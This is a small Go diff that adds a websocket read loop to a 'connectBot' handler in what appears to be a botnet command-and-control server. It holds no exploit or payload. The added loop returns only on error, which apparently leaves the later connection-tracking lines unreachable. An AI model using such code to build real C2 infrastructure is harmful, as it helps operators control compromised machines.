@@ -76,6 +76,19 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	msg := models.BotMessage{}
+	for {
+		ctx, cancel := context.WithTimeout(context.Background(), 1*time.Minute)
+		err := wsjson.Read(ctx, con, &msg)
+		cancel()
+
+		if err != nil {
+			log.Println("Bot Disconnected/Timeout : ", err)
+			return
+		}
+
+	}
+
 	b.Mu.Lock()
 	b.Con = con
 	b.LastSeen = time.Now()
